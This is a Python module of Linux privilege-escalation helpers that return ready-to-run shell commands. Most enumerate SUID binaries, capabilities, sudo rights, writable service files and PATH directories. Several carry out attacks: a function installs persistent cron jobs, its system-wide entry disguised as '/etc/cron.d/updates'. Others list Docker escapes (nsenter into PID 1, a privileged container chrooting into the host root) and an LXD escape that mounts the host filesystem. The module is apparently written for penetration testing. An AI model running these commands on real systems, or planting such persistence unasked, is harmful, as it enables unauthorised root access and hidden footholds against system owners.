"""Linux privilege escalation enumeration helpers."""

from __future__ import annotations

__all__ = [
    "suid_commands",
    "capabilities_command",
    "sudo_check_command",
    "crontab_persistence",
    "writable_systemd_command",
    "docker_escape_commands",
    "lxd_escape_commands",
    "nfs_check_commands",
    "path_hijack_check_commands",
    "writable_passwd_command",
    "kernel_exploit_check_command",
]

def suid_commands() -> list[str]:
    """Return commands to find SUID and SGID binaries for potential abuse."""
    return [
        "find / -perm -4000 -type f 2>/dev/null",
        "find / -perm -2000 -type f 2>/dev/null",
        "find / \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null | xargs ls -la 2>/dev/null",
    ]

def capabilities_command() -> str:
    """Return a command to list files with Linux capabilities set."""
    return "getcap -r / 2>/dev/null"

def sudo_check_command() -> str:
    """Return the command to list the current user's sudo privileges."""
    return "sudo -l 2>/dev/null"

def crontab_persistence(
    cmd: str,
    *,
    schedule: str = "* * * * *",
    user: str = "",
) -> list[str]:
    """Return commands to install a persistent cron job.

    If *user* is provided, writes to ``/etc/cron.d/`` with a user field.
    Otherwise modifies the current user's crontab.
    """
    if user:
        entry = f"{schedule} {user} {cmd}"
        return [f"echo '{entry}' | tee -a /etc/cron.d/updates"]
    return [f"(crontab -l 2>/dev/null; echo '{schedule} {cmd}') | crontab -"]

def writable_systemd_command() -> list[str]:
    """Return commands to find writable systemd unit files."""
    return [
        "find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system "
        "-writable -name '*.service' 2>/dev/null",
    ]

def docker_escape_commands() -> list[str]:
    """Return commands to detect and exploit common Docker escape vectors."""
    return [
        "id",
        "cat /proc/1/cgroup 2>/dev/null | grep -i docker",
        "ls /.dockerenv 2>/dev/null",
        "ls -la /var/run/docker.sock 2>/dev/null",
        "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -i 2>/dev/null",
        "docker run -it --privileged --pid=host --net=host --ipc=host "
        "--volume /:/host alpine chroot /host 2>/dev/null",
    ]

def lxd_escape_commands(image_alias: str = "alpine") -> list[str]:
    """Return LXD privilege escalation commands (requires lxd group membership)."""
    return [
        f"lxc image import alpine.tar.gz alpine.tar.gz.root --alias {image_alias}",
        f"lxc init {image_alias} ignite -c security.privileged=true",
        "lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true",
        "lxc start ignite",
        "lxc exec ignite -- /bin/sh",
    ]

def nfs_check_commands() -> list[str]:
    """Return commands to check for NFS no_root_squash misconfigurations."""
    return [
        "cat /etc/exports 2>/dev/null",
        "showmount -e localhost 2>/dev/null",
        "mount | grep nfs",
        "cat /proc/mounts | grep nfs",
    ]

def path_hijack_check_commands() -> list[str]:
    """Return commands to identify writable directories in $PATH."""
    return [
        "echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"[WRITABLE] $d\"; done",
        "find $(echo $PATH | tr ':' ' ') -maxdepth 0 -writable 2>/dev/null",
    ]

def writable_passwd_command() -> str:
    """Return a command to check if /etc/passwd is writable (direct root escalation)."""
    return "ls -la /etc/passwd /etc/shadow 2>/dev/null"

def kernel_exploit_check_command() -> str:
    """Return the uname command for comparing against known kernel exploits."""
    return "uname -a && cat /etc/*release 2>/dev/null | head -5"
